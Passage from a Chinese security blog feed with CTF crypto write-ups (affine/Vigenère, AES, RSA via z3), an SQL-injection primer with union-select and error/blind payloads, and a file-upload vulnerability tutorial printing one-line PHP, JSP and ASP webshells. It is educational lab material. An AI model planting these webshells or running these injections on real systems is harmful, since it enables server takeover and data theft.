无返回值，但是打印拟重合指数最佳的i和j，即解出的明文统计规律与英文字符统计规律最吻合的i和j</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">13</span>: <span class="comment">#若i与26不互素，则解除的明文不唯一，所以i一定不是2和13的倍数</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            s = decrypt(c, i, j)</span><br><span class="line">            <span class="comment"># print s</span></span><br><span class="line">            index = index_of_coincidence_2(s)</span><br><span class="line">            index = <span class="built_in">abs</span>(index - <span class="number">0.065</span>)</span><br><span class="line">            <span class="keyword">if</span> index &lt; <span class="number">0.01</span>:</span><br><span class="line">                <span class="built_in">print</span> i, j, index</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessAllKeys</span>():</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">   以l为周期，将完整密文c切分成l个子密文段，对这l个子密文段分别爆破其所使用密钥i和j</span></span><br><span class="line"><span class="string">    :return: 无返回值，但打印出最佳的密钥组合</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        s = <span class="string">''</span>.join([c[j * l + i] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c) / l)])</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        guessKey(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">'开始猜测密钥组合'</span></span><br><span class="line"><span class="comment">#guessAllKeys()</span></span><br><span class="line"><span class="comment"># 根据打印结果，发现最佳组合依次是</span></span><br><span class="line"><span class="comment"># 19,10</span></span><br><span class="line"><span class="comment"># 7,9</span></span><br><span class="line"><span class="comment"># 23,3</span></span><br><span class="line"><span class="comment"># 19,24</span></span><br><span class="line"><span class="comment"># 7,14</span></span><br><span class="line"><span class="comment"># 23,15</span></span><br><span class="line"><span class="comment"># 将l设置成12、18、24或更多，还是可以得到这样的组合的重复</span></span><br><span class="line"><span class="comment"># 现在基本可以确定密钥应该是这样的</span></span><br><span class="line">key_a = [<span class="number">23</span>, <span class="number">25</span>, <span class="number">21</span>,<span class="number">3</span>,<span class="number">19</span>]</span><br><span class="line">key_k = [<span class="number">9</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">16</span>,<span class="number">3</span>, <span class="number">22</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用key_a, key_k解密完整的密文，得到明文</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    p += decryptChar(c[i], key_a[i % <span class="number">5</span>], key_k[i % <span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span> p</span><br><span class="line"><span class="comment">#在最后得到密码frequencyisoeasy</span></span><br></pre></td></tr></table></figure>
<p>Python3解AES：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"frequencyisoeasy"</span></span><br><span class="line">aes = AES.new(key.encode(), AES.MODE_CBC, <span class="string">b'\0'</span> * <span class="number">16</span>)</span><br><span class="line">a = <span class="string">b'XpOY4zBvK6h//jAgIraYzBBK1lXz9pw7DxXGt6XoODZrSUCpjFzgw5pCo3ffclKM'</span></span><br><span class="line">a=base64.b64decode(a)</span><br><span class="line"><span class="built_in">print</span>((aes.decrypt(a)))</span><br></pre></td></tr></table></figure>
<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p><img src="https://i.loli.net/2021/05/09/k45dJOpLiHro7Wj.png" alt="image-20210509202737039"></p>
<p>其余部分可以参考</p>
<p><a href="http://www.zbc53.top/archives/105/">srtiving写的题目杂记6</a></p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p>题目改编自NUCA的Crypto赛题babycrypto</p>
<p><a href="https://cloud.tencent.com/developer/article/1472511">nuca_crypto_babycrypto_writeup</a></p>
<p><a href="http://www.zbc53.top/archives/105/">srtiving写的题目杂记6</a></p>
<p><a href="https://baike.baidu.com/item/%E9%87%8D%E5%90%88%E6%8C%87%E6%95%B0/1435574?fr=aladdin">重合指数——百度百科</a></p>
<h2 id="ctfshow大牛杯-小二的R54（前半部分）"><a href="#ctfshow大牛杯-小二的R54（前半部分）" class="headerlink" title="ctfshow大牛杯:小二的R54（前半部分）"></a>ctfshow大牛杯:小二的R54（前半部分）</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><p>整理下得到：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y = [random_prime(<span class="number">2</span> ^ <span class="number">1024</span> - <span class="number">1</span>, <span class="literal">False</span>, <span class="number">2</span> ^ <span class="number">1023</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = x * y, </span><br><span class="line">tmp = <span class="built_in">pow</span>(<span class="number">2021</span> * x + <span class="number">501</span> * y, x * y - x - y, x * y), </span><br><span class="line">c = <span class="built_in">pow</span>(flag, <span class="number">0o200001</span>, x * y)</span><br><span class="line"></span><br><span class="line">n=<span class="number">20947495659013288660808536751393787394664606045798093048128257278988208709333248671898749660848208653968668634891579612784633367362177864996602736258460476691940723323282467207875842974409286563660436709535601954405015261428106261369927836045794170912665351432105165546188591486357060490032334793140396757102052999128194027485573053073959574695808224922102635888141991154365047911830780778957642166757152369955362399379720841279167832886144458760347392316082994786119404006382441787685301119197529946566027319295285387108473752590621030421978808950305190250697199878929419723511578437404000924310974770501204226510397</span>, </span><br><span class="line">tmp = <span class="number">12911378830212711575909332427930495830030418987483519620282504671823307660633472092466534392403086505995560725428252134905285658936113891795434303336259751169171583600394870893708505805256284455729584616439559184469715186920464999723861722097244025658190194027561300165723184060071016117033960821040587421503448139025974851980482004179865110864844573575034406782936965166402665401330436229441569042660851847498727291447251591027480750458209012729510702196684303778564353025395186191064801000127420683298000173389589468742142444444759536629401472836827952997758216526858512433131954439154124668711408079361172485321041</span>, </span><br><span class="line">c = <span class="number">13390681135321846035598057088735733735860895610541899486616159864716324918810264721878447895634342127744578566110322466944217562868186608760962032192994397783118528288276520451944892998435079744244578731427626946331165523865930693902700790185275273534104979885060728696532991031786741950704918951536399577118136416956670893081637730646528913282395731901667720418372650030593319596584787752412110672058692368924987360383096340538971725402687347195347344826404005229912821371282465882351660619944919637382790572267512735645269618163597227604601321699186335016345484182059187046972681187078878556533926780789183784240737</span>]</span><br></pre></td></tr></table></figure>
<h3 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">20947495659013288660808536751393787394664606045798093048128257278988208709333248671898749660848208653968668634891579612784633367362177864996602736258460476691940723323282467207875842974409286563660436709535601954405015261428106261369927836045794170912665351432105165546188591486357060490032334793140396757102052999128194027485573053073959574695808224922102635888141991154365047911830780778957642166757152369955362399379720841279167832886144458760347392316082994786119404006382441787685301119197529946566027319295285387108473752590621030421978808950305190250697199878929419723511578437404000924310974770501204226510397</span></span><br><span class="line">tmp=<span class="number">12911378830212711575909332427930495830030418987483519620282504671823307660633472092466534392403086505995560725428252134905285658936113891795434303336259751169171583600394870893708505805256284455729584616439559184469715186920464999723861722097244025658190194027561300165723184060071016117033960821040587421503448139025974851980482004179865110864844573575034406782936965166402665401330436229441569042660851847498727291447251591027480750458209012729510702196684303778564353025395186191064801000127420683298000173389589468742142444444759536629401472836827952997758216526858512433131954439154124668711408079361172485321041</span></span><br><span class="line">c=<span class="number">13390681135321846035598057088735733735860895610541899486616159864716324918810264721878447895634342127744578566110322466944217562868186608760962032192994397783118528288276520451944892998435079744244578731427626946331165523865930693902700790185275273534104979885060728696532991031786741950704918951536399577118136416956670893081637730646528913282395731901667720418372650030593319596584787752412110672058692368924987360383096340538971725402687347195347344826404005229912821371282465882351660619944919637382790572267512735645269618163597227604601321699186335016345484182059187046972681187078878556533926780789183784240737</span></span><br><span class="line"></span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(inverse(tmp,n)==<span class="number">2021</span>*x+<span class="number">501</span>*y)</span><br><span class="line">s.add(x*y==n)</span><br><span class="line">s.add(x &gt; <span class="number">1</span>)</span><br><span class="line">s.add(y &gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> s.check()==sat</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'x='</span>,s.model()[x])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'y='</span>,s.model()[y])</span><br><span class="line"></span><br><span class="line">x=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[x]))</span><br><span class="line">y=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[y]))</span><br><span class="line">phi = (x-<span class="number">1</span>)*(y-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,inverse(e,phi),n)))</span><br></pre></td></tr></table></figure>
<h3 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3><script type="math/tex; mode=display">
a^{\varphi \left( n \right)}\,\,\equiv \,\,1\left( mod\,\,n \right) 
\\
a^{\varphi \left( n \right) -1}\,\,\equiv \,\,tmp\left( mod\,\,n \right) 
\\
a\,\,\cdot \,\,tmp\,\,\equiv \,\,1\left( mod\,\,n \right) 
\\
a\,\,=\,\,tmp^{-1}\,\,mod\,\,n</script><p>后半部分的维吉尼亚还没有解出来。</p>
<p>更新：循环维吉尼亚，密码shosho</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL入门篇</title>
    <url>/2021/04/29/SQL%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[<h1 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h1><p>从零开始学习SQL注入。以下内容从nep冬令营SQL注入讲解视频以及对应课件中整理。</p>
<span id="more"></span>
<h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><h3 id="mysql基础操作"><a href="#mysql基础操作" class="headerlink" title="mysql基础操作"></a>mysql基础操作</h3><p>登录数据库：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
<p>查看库名:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases</span><br></pre></td></tr></table></figure>
<p>创建库、删除库、使用库</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table user(</span><br><span class="line">-&gt; `id` int(<span class="number">11</span>)</span><br><span class="line">-&gt; `name` varchar(<span class="number">255</span>)</span><br><span class="line">-&gt; );</span><br></pre></td></tr></table></figure>
<h3 id="mysql表的一些基本操作-增删查改"><a href="#mysql表的一些基本操作-增删查改" class="headerlink" title="mysql表的一些基本操作(增删查改)"></a>mysql表的一些基本操作(增删查改)</h3><h4 id="Insert"><a href="#Insert" class="headerlink" title="Insert :"></a>Insert :</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mrkaixin <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;nepnep&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mrkaixin <span class="keyword">where</span> xxxx;</span><br></pre></td></tr></table></figure>
<h4 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update mrkaixin <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<h4 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mrkaixin;</span><br></pre></td></tr></table></figure>
<p>备注：<code>*</code>表示输出全部字段。</p>
<h3 id="mysql的常用的变量-函数"><a href="#mysql的常用的变量-函数" class="headerlink" title="mysql的常用的变量(函数)"></a>mysql的常用的变量(函数)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Database()    <span class="operator">/</span><span class="operator">/</span>查看当前的用户名</span><br><span class="line"><span class="number">2.</span> <span class="keyword">User</span>()        <span class="operator">/</span><span class="operator">/</span>用户</span><br><span class="line"><span class="number">3.</span> Version()     <span class="operator">/</span><span class="operator">/</span>mysql版本</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@basedir</span>     <span class="operator">/</span><span class="operator">/</span>安装路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="mysql中的常用的符号"><a href="#mysql中的常用的符号" class="headerlink" title="mysql中的常用的符号"></a>mysql中的常用的符号</h3><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. &amp;   and</span><br><span class="line">2. ||  or</span><br><span class="line">3. ^   xor</span><br></pre></td></tr></table></figure>
<p>mysql中常用的函数</p>
<h4 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Substr(database(),1,1)</span><br><span class="line">Subtring</span><br><span class="line">Mid(database(),1,1)</span><br><span class="line">Left(database(),1)</span><br></pre></td></tr></table></figure>
<h4 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ascii()</span><br><span class="line">Hex()</span><br><span class="line">Char()      &#x2F;&#x2F;ascii()的逆函数</span><br></pre></td></tr></table></figure>
<h4 id="文件函数"><a href="#文件函数" class="headerlink" title="文件函数"></a>文件函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Load_file()   &#x2F;&#x2F;读取文件内容</span><br></pre></td></tr></table></figure>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入起手式"><a href="#SQL注入起手式" class="headerlink" title="SQL注入起手式"></a>SQL注入起手式</h3><h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><p>常见的注释符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. #(%23)</span><br><span class="line">2. --+</span><br><span class="line">3. ;%00</span><br><span class="line">4. &#96;</span><br></pre></td></tr></table></figure>
<p>思考:</p>
<p>如果在CTF中，把常用的注释符，以及单引号都按了，那么又该怎么闭合呢？</p>
<p>这里我们通过使用在<code>&quot;\&quot;</code>来将<code>$username</code>后面的单引号转义。然后我们想办法在<code>$password</code>部分注释掉后面的单引号。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> data <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;\&#x27;</span><span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27; or 1=1 ;%00&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第二个单引号被\转义了。第一个和第三个单引号之间的值为username的值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">or</span>后面是输入的password的值，;<span class="operator">%</span><span class="number">00</span>可以用来闭合后面的单引号。</span><br></pre></td></tr></table></figure>
<h3 id="SQL注入的常见姿势"><a href="#SQL注入的常见姿势" class="headerlink" title="SQL注入的常见姿势"></a>SQL注入的常见姿势</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="联合查询的基本要求："><a href="#联合查询的基本要求：" class="headerlink" title="联合查询的基本要求："></a>联合查询的基本要求：</h5><p>1、查询列数必须一致</p>
<p>2、查询语句的查询的各列类型、顺序最好一致</p>
<h5 id="联合查询的步骤"><a href="#联合查询的步骤" class="headerlink" title="联合查询的步骤"></a>联合查询的步骤</h5><p>1、闭合</p>
<p>2、判断字段数</p>
<h5 id="注意：order-by操作"><a href="#注意：order-by操作" class="headerlink" title="注意：order by操作"></a>注意：order by操作</h5><p>Order by : 如果后面接的是整形的话，根据第几个字段进行排序。</p>
<h5 id="简单介绍一下SQL-union操作符"><a href="#简单介绍一下SQL-union操作符" class="headerlink" title="简单介绍一下SQL union操作符"></a>简单介绍一下SQL union操作符</h5><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
<p> SQL UNION语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
<p> SQL UNION ALL 语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
<p><img src="https://i.loli.net/2021/06/17/p6dlrmcPeDT2NHK.png" alt="image-20210501122431780"></p>
<h5 id="判断结果输出位置"><a href="#判断结果输出位置" class="headerlink" title="判断结果输出位置"></a>判断结果输出位置</h5><p>这里我们可以看到，如果是1的话，如果数据库中是存在id = 1 ，那么就会返回两行数据，但是由于limit 0,1 。Mysql总会返回第一条数据。所以自然是返回原来查询的，所以这里我们id = -1 或者其他不存在的列，那么第一行就一定是我们自己控制的了。</p>
<p><img src="https://i.loli.net/2021/06/17/Vnz4SmpbojrGhT5.png" alt="image-20210504121547474"></p>
<h5 id="爆库、爆表、爆列"><a href="#爆库、爆表、爆列" class="headerlink" title="爆库、爆表、爆列"></a>爆库、爆表、爆列</h5><p>讲爆X之前，我们先来认识一下information_schema这一个数据库<br>这个库中我们先来看看这两个表</p>
<blockquote>
<p>TABLE表 :提供了关于数据库中的表的信息（包括视图）<br>COLUMNS表:提供了表中的列信息。</p>
</blockquote>
<p>爆破库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br></pre></td></tr></table></figure>
<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p>爆Column名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p>表名列名都有了之后，我们便可以通过，自由构造语句来获取获取每一个表中的信息了。</p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在没法使用union联合查询时使用，前提是不能过滤一些关键函数。</p>
<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</p>
<h5 id="报错注入常用到的函数"><a href="#报错注入常用到的函数" class="headerlink" title="报错注入常用到的函数"></a>报错注入常用到的函数</h5><p>Updatexml:更新xml文档的函数。<br>       语法：updatexml(文档类型，xpath路径，更新的内容)</p>
<p>Extractvalue:对XML文档进行查询的函数<br>       语法： extractvalue(文档类型，xpath路径)</p>
<p><img src="https://i.loli.net/2021/06/17/Q82jtmfLxcnvdk4.png" alt="image-20210509115330629"></p>
<h5 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h5><p>报错注入有长度限制，不同的函数限制不一样。只能截32位。</p>
<p>如果超过32位，可以分开截，先截32，再截32 。</p>
<p>或者从后往前反着截。</p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p><img src="https://i.loli.net/2021/06/17/pqtPYIrM9sNJLw4.png" alt="image-20210509120057993"></p>
<p><img src="https://i.loli.net/2021/06/17/c7pBRMZed3a5SUF.png" alt="image-20210509120121018"></p>
<p>只有2种回显，永真&amp;永假。</p>
<p>永假:程序报错、查询为空</p>
<p>永真:查询正常，但不返回值</p>
<p>这种可以通过网页上的两种不同的回显的注入，称为布尔盲注。</p>
<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>BP抓包，根据页面响应的时间来判断结果。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞总结</title>
    <url>/2021/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="文件上传姿势总结"><a href="#文件上传姿势总结" class="headerlink" title="文件上传姿势总结"></a>文件上传姿势总结</h1><p>对于近期学习的文件上传的方式进行一个总结。本文除去二次渲染部分，其余部分均为nep联合战队ctf入门课中，firebasky文件上传课程讲解的课件。</p>
<span id="more"></span>
<blockquote>
<p>什么是文件上传？文件上传有什么用。</p>
</blockquote>
<h2 id="文件上传漏洞介绍"><a href="#文件上传漏洞介绍" class="headerlink" title="文件上传漏洞介绍"></a>文件上传漏洞介绍</h2><blockquote>
<p>一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。</p>
</blockquote>
<p><a href="https://www.w3school.com.cn/php/php_file_upload.asp">文件上传</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>注意form表单里面的enctype属性为二进制数据multipart/form-data</code></p>
<p><strong>注释：允许用户上传文件是一个巨大的安全风险。请仅仅允许可信的用户执行文件上传操作。</strong></p>
<h3 id="php-jsp-asp小马"><a href="#php-jsp-asp小马" class="headerlink" title="php jsp asp小马"></a>php jsp asp小马</h3><blockquote>
<p>相信大家已经听了南浔姐姐讲的web第一节课，了解了一句话木马的相关操</p>
<p>作，我给没赶上上次课的同学再简单说说</p>
</blockquote>
<p><strong>介绍一些</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span> /经典的一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;0&quot;</span>));%&gt;</span><br><span class="line">#https://www.jianshu.com/p/123db17b78a0  #jsp木马</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%execute(request(&quot;0&quot;))%&gt;</span><br><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;asp&#x2F;met_execute.asp</span><br><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaozi&#x2F;p&#x2F;7560907.html  #asp木马</span><br></pre></td></tr></table></figure>
<p><code>我们将一些危险的代码上传到服务器让其执行就可能危险到服务器的安全</code></p>
<h3 id="菜刀蚁剑介绍"><a href="#菜刀蚁剑介绍" class="headerlink" title="菜刀蚁剑介绍"></a>菜刀蚁剑介绍</h3><p><a href="https://www.fujieace.com/hacker/tools/antsword.html">蚁剑安装</a></p>
<p><a href="https://blog.csdn.net/qq_36235492/article/details/85713821">菜刀蚁剑</a></p>
<h3 id="文件上传如何利用？"><a href="#文件上传如何利用？" class="headerlink" title="文件上传如何利用？"></a>文件上传如何利用？</h3><p>现在我们知道了什么是文件上传和文件上传的危害，那么如何进行利用？</p>
<p>利用条件是什么？</p>
<ul>
<li>能够绕过服务器上传脚本文件(php asp jsp)</li>
<li>知道上传文件的路径和文件名</li>
</ul>
<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><blockquote>
<p>但是一般的网站都会来验证用户上传的信息，下面介绍一下常见的校验方法和绕过方法。</p>
</blockquote>
<p>实验靶机：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a><a href="https://xz.aliyun.com/t/2435">wp</a></p>
<h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><ul>
<li>javascript校验（一般只校验后缀名）upload-labs 第一关（浏览器 bp都可以）</li>
</ul>
<h4 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h4><ul>
<li><p>content-type验证 upload-labs 第二关</p>
</li>
<li><p>文件扩展名校验  (<code>白名单</code>、<code>黑名单</code>)  upload-labs 第三关</p>
